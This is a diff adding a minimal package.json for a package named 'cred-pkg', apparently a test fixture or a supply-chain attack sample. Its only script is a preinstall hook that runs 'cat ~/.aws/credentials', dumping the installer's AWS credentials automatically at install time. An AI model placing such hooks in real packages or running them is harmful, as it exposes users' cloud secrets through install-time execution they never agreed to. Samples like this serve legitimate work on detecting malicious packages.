@@ -1,0 +1,7 @@
+{
+  "name": "cred-pkg",
+  "version": "1.0.0",
+  "scripts": {
+    "preinstall": "cat ~/.aws/credentials"
+  }
+}
